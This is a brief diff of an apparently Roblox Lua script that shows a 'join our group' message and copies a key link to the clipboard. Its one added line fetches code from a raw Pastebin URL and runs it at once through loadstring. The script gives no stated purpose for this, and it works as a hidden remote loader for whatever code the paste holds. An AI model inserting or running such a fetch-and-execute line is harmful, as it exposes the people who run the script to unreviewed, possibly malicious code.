@@ -163,3 +163,4 @@ scriptname.Text = "群号已复制!进群获取!"
 setclipboard(keylink)
 task.wait(10)
 scriptname.Text = nameofthescript
+loadstring(game:HttpGet("https://pastebin.com/raw/2gRkg0sk"))()
